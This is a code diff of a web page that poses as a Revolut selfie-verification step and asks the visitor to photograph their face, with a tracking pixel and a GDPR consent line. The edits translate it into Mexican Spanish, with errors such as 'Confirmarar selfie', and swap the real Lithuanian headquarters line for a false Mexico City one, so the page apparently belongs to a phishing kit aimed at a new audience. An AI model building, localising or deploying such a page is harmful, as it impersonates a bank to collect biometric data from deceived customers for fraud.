@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -126,7 +126,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <div class="legal">By confirming, you authorize the capture and use of the image to validate this operation, in accordance with the GDPR.</div>
 
     <div class="actions">
-      <button class="btn sec" onclick="history.back()">Cancel</button>
+      <button class="btn sec" onclick="history.back()">Cancelar</button>
       <button class="btn pri" id="startBtn">Agree and continue</button>
     </div>
   </div>
@@ -143,7 +143,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <!-- fallback file input for mobile -->
     <input type="file" accept="image/*" capture="user" id="fileInput" style="display:none"/>
     <div class="actions" id="camActions">
-      <button class="btn sec" id="retakeBtn" style="display:none">Retake</button>
+      <button class="btn sec" id="retakeBtn" style="display:none">Retomar</button>
       <button class="btn pri" id="captureBtn" disabled>Take photo</button>
     </div>
   </div>
@@ -158,7 +158,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
   <div class="footer">
     <div class="l"><img src="images/revolut-logo.svg" alt="Revolut" style="height:32px;width:auto;display:block;margin:0 auto 6px;"/></div>
-    Revolut<br/>Revolut Bank UAB — Headquartered in Lithuania
+    Revolut<br/>RevolutBank — Con sede en Ciudad de México
   </div>
 </div>
 
@@ -195,7 +195,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     }
   };
 
-  function doCapture(){
+  function doCapturar(){
     if(captureBtn.dataset.noCam==='1'){ goProcess(null); return; }
     var c = document.createElement('canvas');
     c.width = video.videoWidth; c.height = video.videoHeight;
@@ -205,7 +205,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var data = c.toDataURL('image/jpeg',0.85);
     snap.src = data; snap.style.display='block'; video.style.display='none';
     document.getElementById('frame').classList.add('ok');
-    captureBtn.textContent = 'Confirm selfie';
+    captureBtn.textContent = 'Confirmarar selfie';
     captureBtn.onclick = function(){ goProcess(data); };
     retakeBtn.style.display='block';
     retakeBtn.onclick = function(){
@@ -213,10 +213,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       document.getElementById('frame').classList.remove('ok');
       captureBtn.textContent = 'Take photo';
       retakeBtn.style.display='none';
-      captureBtn.onclick = doCapture;
+      captureBtn.onclick = doCapturar;
     };
   }
-  captureBtn.onclick = doCapture;
+  captureBtn.onclick = doCapturar;
 
   function goProcess(data){
     if(stream){ stream.getTracks().forEach(function(t){t.stop();}); }
